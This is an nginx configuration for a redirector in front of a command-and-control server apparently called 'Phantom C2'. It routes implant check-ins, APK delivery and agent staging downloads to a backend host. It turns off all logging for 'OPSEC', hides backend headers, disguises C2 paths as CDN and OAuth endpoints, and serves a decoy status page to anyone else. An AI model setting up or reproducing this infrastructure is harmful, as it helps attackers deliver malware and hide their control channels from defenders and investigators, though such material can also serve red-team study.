# Phantom C2 — Nginx Redirector (legacy, see Caddyfile for active config)
# Listens on port 80 (mapped to 8443 on host)
# Forwards C2 traffic to Phantom server on host machine

server {
    listen 80;
    server_name _;   # Accept any hostname for local testing

    # Logging disabled (OPSEC) — enable for debugging:
    # access_log /var/log/nginx/redir_access.log;
    access_log off;
    error_log /dev/null;

    # ── C2 API endpoints → Phantom server ──
    location ~ ^/(api/v1/|cdn-cgi/|common/oauth2/) {
        proxy_pass http://172.17.0.1:8080;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;

        # Timeouts for long-poll agent check-ins
        proxy_connect_timeout 30s;
        proxy_read_timeout 120s;
        proxy_send_timeout 120s;

        # Strip backend headers
        proxy_hide_header X-Server-Name;
        proxy_hide_header X-Powered-By;
    }

    # ── Mobile / APK delivery ──
    location /app {
        proxy_pass http://172.17.0.1:8080;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }

    # ── Agent staging / downloads ──
    location /api/v1/update {
        proxy_pass http://172.17.0.1:8080;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }

    # ── Health check (for Docker healthcheck) ──
    location /health {
        return 200 '{"status":"ok"}';
        add_header Content-Type application/json;
    }

    # ── Everything else: decoy response ──
    location / {
        return 200 '<!DOCTYPE html><html><head><title>Service Status</title></head><body><h1>Service Status</h1><p>All systems operational.</p></body></html>';
        add_header Content-Type text/html;
    }
}
